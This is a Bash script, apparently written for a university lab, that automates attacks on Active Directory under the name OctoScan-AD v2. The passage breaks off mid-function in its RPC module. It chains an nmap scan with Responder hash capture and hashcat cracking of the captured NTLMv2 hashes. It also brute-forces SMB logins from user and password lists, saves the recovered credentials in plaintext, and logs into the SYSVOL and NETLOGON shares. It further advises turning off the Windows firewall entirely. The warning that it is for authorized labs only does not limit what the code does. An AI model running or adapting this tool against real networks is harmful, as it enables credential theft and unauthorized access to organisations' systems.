#!/bin/bash
# ============================================================
#   🐙 OctoScan-AD v2 — Herramienta de Pentesting para AD
#   Laboratorio universitario — uso educativo autorizado
#   creado por: sayo
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

TARGET=""
DOMAIN=""
IFACE=""
USERS_FILE=""
PASSWORDS_FILE=""
CRED_USER=""
CRED_PASS=""
CRED_HASH=""
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OUTPUT_DIR=""
REPORT_FILE=""

# Puertos AD y su estado (open/filtered)
declare -A PORT_STATUS

banner() {
    clear
    echo -e "${CYAN}"
    cat << 'ASCIIART'
                                      ..-+##%#*=:.
                                   =%+:.        ..=#*.
                                .*+.                 -#=
                               **                      :@:
                             .%:                         ++
                            .#.                           #-
                            ==.:                         -:#.
                            #: *.                       *: #.
                            %: =+                      .@. *:           .::.
                            %:.#-   .-:.        .:==.   %+ #:       .=*.    -*:
             -*=--+*.       *=** -%@@@@@@=    .#@@@@@@%: #=%.      += .##=:-*-.+.
           :*.===+: .*:     -%@.*@@@@@@@@@#-.=#@@@@@@@@@:-@#.     +. =#.     .#:+
           = +    :%. +.    .%@.*@@@@@@@@@-: =-@@@@@@@@@:-@+     := :==       :*+
           =*:     =* .#     *@..@@@@@@@@.=#%+=:@@@@@@@* -@.     := -:*        .
                   ++ .%    ++.  .+***+- .#@@@#. -++*=-   .=+     +.::=:
         ..-++=:. :*- ==    #-           .%@@@%.          :%.     =: +.#.
       :*: ..   .-*::.+      =@- .:=-.   :@@#@@-   :#%#+=%#.      .# .=.#
      :*+-.  .-+-+.+ .=       .=@+%+#*-   :: ::   -*##:++.        :*  = *.
                :+:: :%:       ==.%  *-           :* =-.%.       .+. .= # ..:===-..
                -=:- .=.++.  -#: =:  *.           .* .%. -#:  :+*:   +.+%-..     ..=+
                .*.-. -+  .-=-:  +=   -*=:.     .-++.  .+    ..      **-. ...++=--=++:-=
            .+%=:..:+#-.*:.    :*.        .-+++-.  .:   .#:       .=*:**-.  .:**.    .#+=
          :+.          .*::=**+-.      :=           --     .+*+=+#+:=+.          :*.    .:
 -+++.  .+:  .---:---.   .+.          :%-     =.    :%:           -*.  .--=====--  =-
.#.+##+.#. .*:#=. .+#:=.   ==       .+:+.     #.    .+-+.       .*:   =:#+:.   ++-. ==  .****.
=.=:   :+  --%:  ++:..:+.-   .*=--+#=..#.     .%-     .#..+*-.  ==   :-+-   .:*. .+-: =-  .::*:#:
=.--  -+. =:+  .*=+===++%==    .=+===+-      .%.#.      -+=--=+=    :=%+++++-  -- .*=: ==    =:*-
-+ :*. :*. .+=+   ++        +:=.               .*.  *.                =:*      .*  +   ++- .*-.  .+--%
 :*. .:=++=:.  ==#.               .*=-         -#.   .=+             :+*:    -#+*..%.    :#+:  .:=++-..**.
   -*=:.  .:-+*=.                   :+#*-.  .-++.       .=+-.      :+#*:       -++=:        :+**=---=*%+.
      .-+*+=.                            :=+++-.               .=*##+=.
ASCIIART
    echo -e "${NC}"
    echo -e "${MAGENTA}  OctoScan-AD v2 | Pentesting para Active Directory${NC}"
    echo -e "${WHITE}  ────────────────────────────────────────────────${NC}"
    echo -e "${YELLOW}  ⚠️  Solo para laboratorios autorizados${NC}"
    echo -e "${WHITE}  ────────────────────────────────────────────────${NC}"
    echo -e "  ${DIM}creado por: sayo${NC}"
    echo ""
}

log_info()    { echo -e "${CYAN}[*]${NC} $1";  echo "[INFO] $1" >> "$REPORT_FILE" 2>/dev/null; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; echo "[OK]   $1" >> "$REPORT_FILE" 2>/dev/null; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; echo "[WARN] $1" >> "$REPORT_FILE" 2>/dev/null; }
log_error()   { echo -e "${RED}[-]${NC} $1";   echo "[ERR]  $1" >> "$REPORT_FILE" 2>/dev/null; }
log_section() {
    echo ""
    echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${WHITE}  🔍 $1${NC}"
    echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}"
    echo ""
    echo -e "\n========================================\n  $1\n========================================" >> "$REPORT_FILE" 2>/dev/null
}

check_tool() {
    command -v "$1" &>/dev/null
}

port_open() {
    [ "${PORT_STATUS[$1]}" = "open" ]
}

# ─── PASO 1: Verificar y elegir interfaz de red ──────────────
seleccionar_interfaz() {
    log_section "PASO 1 — Interfaz de Red"
    echo -e "${WHITE}  Interfaces disponibles:${NC}"
    echo ""
    nmcli device status 2>/dev/null | grep -v "^DEVICE" | while read line; do
        DEV=$(echo "$line" | awk '{print $1}')
        TYPE=$(echo "$line" | awk '{print $2}')
        STATE=$(echo "$line" | awk '{print $3}')
        if [ "$STATE" = "connected" ]; then
            IP_IFACE=$(ip -4 addr show "$DEV" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
            echo -e "  ${GREEN}▶ $DEV${NC}  ${DIM}[$TYPE]${NC}  ${GREEN}$STATE${NC}  ${CYAN}IP: ${IP_IFACE:-sin IP}${NC}"
        else
            echo -e "  ${DIM}  $DEV  [$TYPE]  $STATE${NC}"
        fi
    done
    echo ""

    # Interfaz conectada por defecto
    DEFAULT_IFACE=$(nmcli device status 2>/dev/null | awk '$3=="connected" && $2!="loopback" {print $1; exit}')

    echo -e "  ${YELLOW}Interfaz sugerida: ${WHITE}${DEFAULT_IFACE:-ninguna detectada}${NC}"
    echo ""
    read -p "$(echo -e ${CYAN}"  [?] Interfaz a usar (Enter para '$DEFAULT_IFACE'): "${NC})" INPUT_IFACE
    IFACE="${INPUT_IFACE:-$DEFAULT_IFACE}"

    if [ -z "$IFACE" ]; then
        log_error "No se pudo detectar interfaz. Introduce una manualmente."
        read -p "$(echo -e ${CYAN}"  [?] Interfaz: "${NC})" IFACE
    fi

    MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
    log_success "Interfaz seleccionada: $IFACE  (tu IP: ${MY_IP:-desconocida})"
    echo ""
}

# ─── PASO 2: Configurar target ───────────────────────────────
pedir_target() {
    log_section "PASO 2 — Target y Resultados"
    echo -e "${WHITE}  Configuración del objetivo${NC}"
    echo ""

    while true; do
        read -p "$(echo -e ${CYAN}"  [?] IP del servidor objetivo: "${NC})" TARGET
        if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            break
        else
            log_error "IP inválida, intenta de nuevo"
        fi
    done

    echo ""
    echo -e "  ${YELLOW}¿Dónde guardar los resultados?${NC}"
    echo -e "  ${DIM}Ejemplos: /root/Desktop  /home/kali  /tmp${NC}"
    echo ""
    while true; do
        read -p "$(echo -e ${CYAN}"  [?] Ruta de guardado: "${NC})" BASE_DIR
        BASE_DIR="${BASE_DIR/#\~/$HOME}"
        [ -d "$BASE_DIR" ] && break
        log_error "La ruta no existe: $BASE_DIR"
    done

    echo ""
    read -p "$(echo -e ${CYAN}"  [?] Nombre de la carpeta (Enter = timestamp): "${NC})" FOLDER_NAME
    [ -z "$FOLDER_NAME" ] && FOLDER_NAME="${TIMESTAMP}"
    FOLDER_NAME=$(echo "$FOLDER_NAME" | tr ' ' '_' | tr -cd '[:alnum:]_-')

    OUTPUT_DIR="$BASE_DIR/octoscan_results_${FOLDER_NAME}"
    REPORT_FILE="$OUTPUT_DIR/reporte_final.txt"

    if mkdir -p "$OUTPUT_DIR" 2>/dev/null; then
        log_success "Carpeta creada: $OUTPUT_DIR"
    else
        OUTPUT_DIR="/tmp/octoscan_results_${FOLDER_NAME}"
        REPORT_FILE="$OUTPUT_DIR/reporte_final.txt"
        mkdir -p "$OUTPUT_DIR"
        log_warn "Usando ruta alternativa: $OUTPUT_DIR"
    fi

    echo "OctoScan-AD v2 | Target: $TARGET | Iface: $IFACE | $(date)" > "$REPORT_FILE"
    echo ""
    log_success "Target:     $TARGET"
    log_success "Interfaz:   $IFACE"
    log_info    "Resultados: $OUTPUT_DIR"
    echo ""
}

# ─── PASO 2.5: Verificar conectividad con el target ──────────
verificar_conectividad() {
    log_section "PASO 2.5 — Verificación de Conectividad"

    MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
    MY_NET=$(echo "$MY_IP" | cut -d. -f1-3)
    TARGET_NET=$(echo "$TARGET" | cut -d. -f1-3)

    echo -e "  ${WHITE}Tu IP:       ${CYAN}$MY_IP${NC}"
    echo -e "  ${WHITE}Target IP:   ${CYAN}$TARGET${NC}"
    echo ""

    # ── Verificar si están en la misma red ──
    if [ "$MY_NET" = "$TARGET_NET" ]; then
        log_success "Misma red local detectada ($MY_NET.x) — conectividad óptima ✓"
        MISMA_RED=true
    else
        log_warn "Redes diferentes — tu red: $MY_NET.x | target: $TARGET_NET.x"
        MISMA_RED=false
    fi

    echo ""

    # ── Ping test ──
    log_info "Probando ping a $TARGET..."
    if ping -c 3 -W 2 "$TARGET" &>/dev/null; then
        RTT=$(ping -c 3 -W 2 "$TARGET" 2>/dev/null | tail -1 | grep -oP 'avg = \K[0-9.]+' || \
              ping -c 3 -W 2 "$TARGET" 2>/dev/null | tail -1 | awk -F'/' '{print $5}')
        log_success "Ping OK — latencia promedio: ${RTT:-?} ms"
        PING_OK=true
    else
        log_error "Sin respuesta al ping — el target puede estar bloqueando ICMP o no hay ruta"
        PING_OK=false
    fi

    echo ""

    # ── Traceroute rápido ──
    log_info "Trazando ruta hacia $TARGET..."
    HOPS=$(traceroute -m 10 -w 1 "$TARGET" 2>/dev/null | tail -n +2 | wc -l)
    LAST_HOP=$(traceroute -m 10 -w 1 "$TARGET" 2>/dev/null | tail -1)

    if echo "$LAST_HOP" | grep -q "$TARGET"; then
        log_success "Ruta completa — $HOPS saltos hasta el target"
    else
        log_warn "Ruta incompleta — posible firewall en el camino"
        echo -e "  ${DIM}Último salto visible: $LAST_HOP${NC}"
    fi

    echo ""

    # ── Test de puertos clave con nc ──
    log_info "Comprobando puertos AD clave (conexión rápida)..."
    echo ""
    PUERTOS_CLAVE=(445 389 88 5985 3389 135)
    NOMBRES_CLAVE=("SMB" "LDAP" "Kerberos" "WinRM" "RDP" "RPC")
    ALGUNO_ABIERTO=false

    for i in "${!PUERTOS_CLAVE[@]}"; do
        p="${PUERTOS_CLAVE[$i]}"
        n="${NOMBRES_CLAVE[$i]}"
        if nc -z -w 2 "$TARGET" "$p" &>/dev/null; then
            log_warn "  Puerto $p ($n) — ALCANZABLE ⚡"
            ALGUNO_ABIERTO=true
        else
            echo -e "  ${DIM}  Puerto $p ($n) — no alcanzable${NC}"
        fi
    done

    echo ""

    # ── Diagnóstico y recomendación ──
    echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${WHITE}  📋 Diagnóstico${NC}"
    echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}"
    echo ""

    if [ "$ALGUNO_ABIERTO" = true ]; then
        log_success "¡Conectividad confirmada! Puedes continuar con la auditoría."
        echo ""
        echo -e "  ${GREEN}✓ El script puede hacer el escaneo completo${NC}"
        echo -e "  ${GREEN}✓ Los módulos de ataque van a funcionar${NC}"
        if [ "$MISMA_RED" = false ]; then
            echo -e "  ${YELLOW}⚠ No estás en la misma red — Responder NO va a funcionar${NC}"
            echo -e "  ${DIM}    Para usar Responder necesitas estar en la red local del server${NC}"
        else
            echo -e "  ${GREEN}✓ Estás en la misma red — todos los módulos disponibles${NC}"
        fi

    elif [ "$PING_OK" = true ]; then
        log_warn "Hay ruta al target pero los puertos AD están bloqueados."
        echo ""
        echo -e "  ${YELLOW}Posibles causas:${NC}"
        echo -e "  ${DIM}  → Firewall de Windows bloqueando los puertos${NC}"
        echo -e "  ${DIM}  → El server no tiene los servicios AD activos${NC}"
        echo -e "  ${DIM}  → Reglas de red entre tú y el server${NC}"
        echo ""
        echo -e "  ${CYAN}Solución:${NC} Pídele a tu compañero que ejecute en su server:"
        echo -e "  ${WHITE}  netsh advfirewall set allprofiles state off${NC}"
        echo -e "  ${DIM}  (desactiva el firewall de Windows temporalmente para el lab)${NC}"

    else
        log_error "Sin conectividad con $TARGET"
        echo ""
        echo -e "  ${RED}No hay ruta hacia el servidor. Causas más comunes:${NC}"
        echo ""
        echo -e "  ${YELLOW}1. Estás en redes distintas sin VPN${NC}"
        echo -e "  ${DIM}     Tu Kali ($MY_IP) y el server ($TARGET) están en redes separadas."
        echo -e "     El router del server bloquea todo el tráfico externo.${NC}"
        echo ""
        echo -e "  ${YELLOW}2. Solución A — Tailscale (más fácil, 5 min):${NC}"
        echo -e "  ${DIM}     En el SERVER (Windows):${NC}"
        echo -e "  ${WHITE}       Descargar: https://tailscale.com/download/windows${NC}"
        echo -e "  ${DIM}     En tu KALI:${NC}"
        echo -e "  ${WHITE}       curl -fsSL https://tailscale.com/install.sh | sh${NC}"
        echo -e "  ${WHITE}       sudo tailscale up${NC}"
        echo -e "  ${DIM}     Ambos se agregan a la misma cuenta → quedan en la misma red virtual${NC}"
        echo -e "  ${DIM}     Usa la IP que te da Tailscale (100.x.x.x) como target${NC}"
        echo ""
        echo -e "  ${YELLOW}3. Solución B — Wireguard VPN:${NC}"
        echo -e "  ${DIM}     Tu compañero instala Wireguard en el server y te pasa el${NC}"
        echo -e "  ${DIM}     archivo .conf — te conectas con: sudo wg-quick up archivo.conf${NC}"
        echo ""
        echo -e "  ${YELLOW}4. Solución C — Misma red física:${NC}"
        echo -e "  ${DIM}     Conectar tu Kali al mismo router/switch que el server${NC}"
        echo ""
        echo -e "  ${CYAN}Una vez conectado por VPN o red local, vuelve a correr el script${NC}"
        echo -e "  ${CYAN}y la verificación pasará automáticamente.${NC}"
        echo ""

        read -p "$(echo -e ${YELLOW}"  [?] ¿Continuar de todas formas? (s/N): "${NC})" FORZAR
        if [[ ! "${FORZAR,,}" =~ ^s ]]; then
            echo ""
            log_info "Saliendo. Conéctate a la red del server y vuelve a intentarlo."
            exit 0
        fi
        log_warn "Continuando sin conectividad verificada — los resultados pueden estar vacíos"
    fi

    echo ""
    echo "CONECTIVIDAD: ping=$PING_OK misma_red=$MISMA_RED algún_puerto=$ALGUNO_ABIERTO" >> "$REPORT_FILE"
}

# ─── PASO 3: Escaneo de puertos ──────────────────────────────
modulo_portscan() {
    log_section "PASO 3 — Escaneo de Puertos (NMAP)"
    local out="$OUTPUT_DIR/01_nmap.txt"

    log_info "Escaneando $TARGET con nmap -sV..."
    nmap -sV -sC --open \
        -p 53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,9389 \
        "$TARGET" -oN "$out" 2>/dev/null

    echo ""
    echo -e "${BOLD}${WHITE}  Resultado del escaneo:${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"

    declare -A PUERTOS_INFO
    PUERTOS_INFO[53]="DNS"
    PUERTOS_INFO[80]="HTTP"
    PUERTOS_INFO[88]="Kerberos"
    PUERTOS_INFO[135]="RPC"
    PUERTOS_INFO[139]="NetBIOS"
    PUERTOS_INFO[389]="LDAP"
    PUERTOS_INFO[443]="HTTPS"
    PUERTOS_INFO[445]="SMB"
    PUERTOS_INFO[464]="Kerberos chpw"
    PUERTOS_INFO[593]="RPC-HTTP"
    PUERTOS_INFO[636]="LDAPS"
    PUERTOS_INFO[1433]="MSSQL"
    PUERTOS_INFO[3268]="Global Catalog"
    PUERTOS_INFO[3269]="GC SSL"
    PUERTOS_INFO[3389]="RDP"
    PUERTOS_INFO[5985]="WinRM"
    PUERTOS_INFO[5986]="WinRM-SSL"
    PUERTOS_INFO[9389]="AD Web Services"

    for puerto in "${!PUERTOS_INFO[@]}"; do
        nombre="${PUERTOS_INFO[$puerto]}"
        if grep -qE "^${puerto}/tcp.*open" "$out" 2>/dev/null; then
            PORT_STATUS[$puerto]="open"
            log_warn "  Puerto $puerto ($nombre) — ABIERTO ⚠️"
        else
            PORT_STATUS[$puerto]="closed"
            log_success "  Puerto $puerto ($nombre) — cerrado/filtrado ✓"
        fi
    done

    echo ""
    log_success "Escaneo completado → $out"
    cat "$out" >> "$REPORT_FILE"
}

# ─── Detectar dominio ────────────────────────────────────────
detectar_dominio() {
    if [ -z "$DOMAIN" ]; then
        log_info "Detectando dominio automáticamente..."
        DOMAIN=$(ldapsearch -x -H "ldap://$TARGET" -s base 2>/dev/null \
            | grep "defaultNamingContext" \
            | sed 's/.*DC=\([^,]*\),DC=\([^,]*\).*/\1.\2/' \
            | head -1)
        if [ -n "$DOMAIN" ]; then
            log_success "Dominio detectado: $DOMAIN"
        else
            log_warn "No se pudo detectar automáticamente"
            read -p "$(echo -e ${CYAN}"  [?] Introduce el dominio (ej: Technova.com): "${NC})" DOMAIN
        fi
    fi
}

# ─── Pedir diccionarios ──────────────────────────────────────
pedir_diccionarios() {
    if [ -z "$USERS_FILE" ]; then
        while true; do
            read -p "$(echo -e ${CYAN}"  [?] Archivo de usuarios: "${NC})" USERS_FILE
            [ -f "$USERS_FILE" ] && { log_success "Usuarios: $(wc -l < "$USERS_FILE") entradas"; break; }
            log_error "No encontrado: $USERS_FILE"
        done
    fi
    if [ -z "$PASSWORDS_FILE" ]; then
        while true; do
            read -p "$(echo -e ${CYAN}"  [?] Archivo de contraseñas: "${NC})" PASSWORDS_FILE
            [ -f "$PASSWORDS_FILE" ] && { log_success "Contraseñas: $(wc -l < "$PASSWORDS_FILE") entradas"; break; }
            log_error "No encontrado: $PASSWORDS_FILE"
            echo -e "  ${YELLOW}Tip:${NC} /usr/share/wordlists/rockyou.txt"
        done
    fi
}

# ─── Guardar credenciales descubiertas ───────────────────────
guardar_credenciales() {
    local user="$1" pass="$2" origen="$3"
    CRED_USER="$user"
    CRED_PASS="$pass"
    echo "$user:$pass" >> "$OUTPUT_DIR/credenciales_encontradas.txt"
    log_success "Credencial guardada: $user:$pass  [origen: $origen]"
}

mostrar_credenciales() {
    echo ""
    echo -e "${BOLD}${WHITE}  Credenciales disponibles:${NC}"
    if [ -n "$CRED_USER" ]; then
        echo -e "  ${GREEN}Usuario:    $CRED_USER${NC}"
        echo -e "  ${GREEN}Contraseña: $CRED_PASS${NC}"
        [ -n "$CRED_HASH" ] && echo -e "  ${YELLOW}Hash:       $CRED_HASH${NC}"
    else
        echo -e "  ${YELLOW}No hay credenciales aún — usa un módulo de ataque primero${NC}"
    fi
    echo ""
}

# ─── MÓDULO A: LDAP anónimo ──────────────────────────────────
modulo_ldap() {
    if ! port_open 389; then
        log_warn "Puerto 389 (LDAP) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Reconocimiento LDAP"
    local out="$OUTPUT_DIR/ldap.txt"
    detectar_dominio
    log_info "Consultando LDAP anónimo en $TARGET..."
    ldapsearch -x -H "ldap://$TARGET" -s base > "$out" 2>&1
    if grep -q "result: 0 Success" "$out"; then
        log_warn "LDAP anónimo responde — información expuesta:"
        grep -E "dnsHostName|defaultNamingContext|domainFunctionality|serverName" "$out" \
            | while read l; do log_warn "  → $l"; done
    else
        log_success "LDAP anónimo bloqueado ✓"
    fi
    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO B: Captura de hash con Responder ─────────────────
modulo_responder() {
    log_section "MÓDULO — Captura de Hash (Responder)"
    echo -e "  ${YELLOW}Esto capturará hashes NTLMv2 cuando un cliente de la red intente autenticarse${NC}"
    echo -e "  ${CYAN}Interfaz: $IFACE${NC}"
    echo ""

    if ! check_tool responder; then
        log_error "responder no disponible — instala: sudo apt install responder"
        return
    fi

    local out="$OUTPUT_DIR/responder_hashes.txt"
    log_warn "Iniciando Responder en $IFACE — Ctrl+C para detener cuando captures un hash"
    echo ""
    sudo responder -I "$IFACE" -dwv 2>&1 | tee "$out"

    echo ""
    # Buscar hashes capturados en logs de responder
    HASH_FILE=$(find /usr/share/responder/logs/ -name "*.txt" -newer "$REPORT_FILE" 2>/dev/null | head -1)
    if [ -n "$HASH_FILE" ]; then
        CRED_HASH=$(grep -oP '[A-Za-z0-9_-]+::[A-Z0-9]+:[A-Fa-f0-9]+:[A-Fa-f0-9]+:[A-Fa-f0-9]+' "$HASH_FILE" | head -1)
        if [ -n "$CRED_HASH" ]; then
            log_success "Hash capturado:"
            echo -e "  ${CYAN}$CRED_HASH${NC}"
            echo "$CRED_HASH" > "$OUTPUT_DIR/hash_capturado.txt"
            log_info "Guardado en: $OUTPUT_DIR/hash_capturado.txt"
            echo ""
            log_info "Siguiente paso: Módulo de crackeo de hash (opción en menú)"
        fi
    else
        log_warn "No se detectaron hashes automáticamente"
        echo ""
        read -p "$(echo -e ${CYAN}"  [?] Pega el hash NTLMv2 manualmente (o Enter para saltar): "${NC})" MANUAL_HASH
        if [ -n "$MANUAL_HASH" ]; then
            CRED_HASH="$MANUAL_HASH"
            echo "$CRED_HASH" > "$OUTPUT_DIR/hash_capturado.txt"
            log_success "Hash guardado"
        fi
    fi
}

# ─── MÓDULO C: Crackeo de hash con Hashcat ───────────────────
modulo_hashcat() {
    log_section "MÓDULO — Crackeo de Hash (Hashcat)"

    if ! check_tool hashcat; then
        log_error "hashcat no disponible — instala: sudo apt install hashcat"
        return
    fi

    # Verificar que hay hash
    if [ -z "$CRED_HASH" ]; then
        if [ -f "$OUTPUT_DIR/hash_capturado.txt" ]; then
            CRED_HASH=$(cat "$OUTPUT_DIR/hash_capturado.txt")
            log_info "Hash cargado desde archivo"
        else
            read -p "$(echo -e ${CYAN}"  [?] Pega el hash NTLMv2: "${NC})" CRED_HASH
            echo "$CRED_HASH" > "$OUTPUT_DIR/hash_capturado.txt"
        fi
    fi

    echo -e "  ${CYAN}Hash a crackear:${NC} ${DIM}${CRED_HASH:0:60}...${NC}"
    echo ""
    echo -e "  ${WHITE}Modo de ataque:${NC}"
    echo -e "  ${CYAN}[1]${NC} Diccionario  ${DIM}(rockyou.txt — rápido)${NC}"
    echo -e "  ${CYAN}[2]${NC} Fuerza bruta ${DIM}(?a x6 — más exhaustivo, más lento)${NC}"
    echo -e "  ${CYAN}[3]${NC} Ambos en secuencia"
    echo ""
    read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" HC_OPT

    local out="$OUTPUT_DIR/hashcat_resultado.txt"

    case $HC_OPT in
        1|3)
            log_info "Atacando con diccionario..."
            hashcat -m 5600 -a 0 "$OUTPUT_DIR/hash_capturado.txt" \
                /usr/share/wordlists/rockyou.txt \
                --potfile-path "$OUTPUT_DIR/hashcat.pot" \
                --outfile "$out" 2>/dev/null
            ;;
    esac

    case $HC_OPT in
        2|3)
            log_info "Atacando con fuerza bruta (?a x 6)..."
            hashcat -m 5600 -a 3 "$OUTPUT_DIR/hash_capturado.txt" \
                "?a?a?a?a?a?a" \
                --potfile-path "$OUTPUT_DIR/hashcat.pot" \
                --outfile "$out" --outfile-append 2>/dev/null
            ;;
    esac

    echo ""
    if [ -f "$out" ] && [ -s "$out" ]; then
        CRACKED=$(cat "$out" | head -1)
        log_success "¡Hash crackeado!"
        echo -e "  ${GREEN}${BOLD}$CRACKED${NC}"
        # Extraer usuario y contraseña
        CRED_USER=$(echo "$CRACKED" | cut -d':' -f1)
        CRED_PASS=$(echo "$CRACKED" | rev | cut -d':' -f1 | rev)
        guardar_credenciales "$CRED_USER" "$CRED_PASS" "hashcat"
    else
        # Buscar en potfile
        POT=$(hashcat -m 5600 "$OUTPUT_DIR/hash_capturado.txt" \
            --potfile-path "$OUTPUT_DIR/hashcat.pot" --show 2>/dev/null | head -1)
        if [ -n "$POT" ]; then
            log_success "¡Contraseña encontrada (potfile)!"
            echo -e "  ${GREEN}${BOLD}$POT${NC}"
            CRED_PASS=$(echo "$POT" | rev | cut -d':' -f1 | rev)
        else
            log_warn "No se pudo crackear el hash con los métodos elegidos"
        fi
    fi
    cat "$out" >> "$REPORT_FILE" 2>/dev/null
}

# ─── MÓDULO D: SMB Bruteforce / Netexec ──────────────────────
modulo_smb_netexec() {
    if ! port_open 445; then
        log_warn "Puerto 445 (SMB) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Ataque Diccionario SMB (netexec)"

    pedir_diccionarios

    if ! check_tool netexec; then
        log_error "netexec no disponible — instala: sudo apt install netexec"
        return
    fi

    local out="$OUTPUT_DIR/smb_netexec.txt"
    log_warn "Iniciando ataque contra $TARGET..."
    netexec smb "$TARGET" -u "$USERS_FILE" -p "$PASSWORDS_FILE" \
        --continue-on-success 2>/dev/null | tee "$out"

    echo ""
    if grep -q "\[+\]" "$out"; then
        log_success "¡Credenciales válidas encontradas!"
        grep "\[+\]" "$out" | while read l; do
            log_success "  → $l"
            U=$(echo "$l" | grep -oP '(?<=\\)[^\s]+')
            P=$(echo "$l" | grep -oP '(?<=:)[^\s]+$')
            [ -n "$U" ] && guardar_credenciales "$U" "$P" "netexec-smb"
        done
    else
        log_success "No se encontraron credenciales válidas ✓"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO E: Enumeración SMB con credenciales ──────────────
modulo_smb_enum() {
    if ! port_open 445; then
        log_warn "Puerto 445 (SMB) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Enumeración SMB (crackmapexec + smbmap)"
    mostrar_credenciales

    if [ -z "$CRED_USER" ]; then
        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
    fi

    local out="$OUTPUT_DIR/smb_enum.txt"

    # crackmapexec para shares
    if check_tool crackmapexec; then
        log_info "Enumerando shares con crackmapexec..."
        crackmapexec smb "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" --shares 2>/dev/null | tee "$out"
    elif check_tool netexec; then
        log_info "Enumerando shares con netexec..."
        netexec smb "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" --shares 2>/dev/null | tee "$out"
    else
        log_warn "crackmapexec/netexec no disponible"
    fi

    echo ""

    # smbmap para análisis de privilegios
    if check_tool smbmap; then
        log_info "Analizando privilegios con smbmap..."
        smbmap -H "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" 2>/dev/null | tee -a "$out"
    else
        log_warn "smbmap no disponible — instala: sudo apt install smbmap"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO F: Acceso y extracción SMB ───────────────────────
modulo_smb_acceso() {
    if ! port_open 445; then
        log_warn "Puerto 445 (SMB) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Acceso y Extracción SMB (smbclient)"
    mostrar_credenciales

    if [ -z "$CRED_USER" ]; then
        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
    fi

    detectar_dominio

    if ! check_tool smbclient; then
        log_error "smbclient no disponible — instala: sudo apt install smbclient"
        return
    fi

    echo ""
    echo -e "  ${WHITE}¿Qué recurso quieres acceder?${NC}"
    echo -e "  ${CYAN}[1]${NC} SYSVOL  ${DIM}(políticas de dominio)${NC}"
    echo -e "  ${CYAN}[2]${NC} NETLOGON"
    echo -e "  ${CYAN}[3]${NC} Listar todos los recursos disponibles"
    echo -e "  ${CYAN}[4]${NC} Recurso personalizado"
    echo ""
    read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" SMB_OPT

    case $SMB_OPT in
        1)
            log_info "Accediendo a SYSVOL..."
            smbclient "//$TARGET/SYSVOL" -U "$CRED_USER%$CRED_PASS" 2>/dev/null
            ;;
        2)
            log_info "Accediendo a NETLOGON..."
            smbclient "//$TARGET/NETLOGON" -U "$CRED_USER%$CRED_PASS" 2>/dev/null
            ;;
        3)
            log_info "Listando recursos en $TARGET..."
            smbclient -L "//$TARGET" -U "${DOMAIN}/${CRED_USER}%${CRED_PASS}" 2>/dev/null | tee "$OUTPUT_DIR/smb_shares_list.txt"
            ;;
        4)
            read -p "$(echo -e ${CYAN}"  [?] Nombre del recurso: "${NC})" SHARE_NAME
            log_info "Accediendo a $SHARE_NAME..."
            smbclient "//$TARGET/$SHARE_NAME" -U "${DOMAIN}/${CRED_USER}%${CRED_PASS}" 2>/dev/null
            ;;
    esac
    log_success "Sesión SMB cerrada"
}

# ─── MÓDULO G: Enumeración RPC ───────────────────────────────
modulo_rpc() {
    if ! port_open 135 && ! port_open 445; then
        log_warn "Puertos RPC/SMB cerrados — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Enumeración RPC (rpcclient)"
    mostrar_credenciales

    if [ -z "$CRED_USER" ]; then
        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
    fi

    if ! check_tool rpcclient; then
        log_error "rpcclient no disponible"
        return
    fi

    local out="$OUTPUT_DIR/rpc_enum.txt"
    echo ""
    echo -e "  ${WHITE}Opciones de enumeración RPC:${NC}"
    echo -e "  ${CYAN}[1]${NC} enumdomusers   ${DIM}(todos los usuarios del dominio)${NC}"
    echo -e "  ${CYAN}[2]${NC} enumdomgroups  ${DIM}(todos los grupos)${NC}"
    echo -e "  ${CYAN}[3]${NC} querygroup/user por RID"
    echo -e "  ${CYAN}[4]${NC} Sesión interactiva completa"
    echo ""
    read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" RPC_OPT

    case $RPC_OPT in
        1)
            log_info "Enumerando usuarios del dominio..."
